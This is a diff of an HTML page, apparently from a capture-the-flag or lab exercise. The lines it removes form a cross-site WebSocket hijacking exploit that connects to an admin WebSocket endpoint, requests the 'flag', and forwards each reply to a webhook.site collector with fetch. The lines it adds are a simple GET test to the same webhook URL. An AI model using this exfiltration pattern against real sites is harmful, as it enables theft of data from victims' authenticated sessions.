@@ -1,20 +1,19 @@
+<!DOCTYPE html>
 <html>
-    <head>
-        <title>Cross-site WebSocket hijacking</title>
-    </head>
-    <body>
-        <script>
-	        // Create a new WebSocket object that points to /chat endpoint
-            var webSocket = new WebSocket('wss://127.0.0.1:8080/admin/ws');
-            webSocket.onopen = function() {
-	            // Send "READY" message to /chat to render the chat history
-                webSocket.send("flag");
-            };
-            webSocket.onmessage = function(event) {
-	            // Send a GET request with the chat history to exploit server 
-                fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/?'+event.data, {method: 'GET'});
-            };
-	fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/?'+event.data, {method: 'GET'});	
-        </script>
-    </body>
+<head>
+    <title>Fetch Example</title>
+</head>
+<body>
+    <script>
+        // Perform a GET request to the specified URL
+        fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/', {
+            method: 'GET'
+        }).then(response => {
+            console.log('Request sent successfully.');
+        }).catch(error => {
+            console.error('Error sending request:', error);
+        });
+    </script>
+    <p>Fetching data... Check the server logs.</p>
+</body>
 </html>
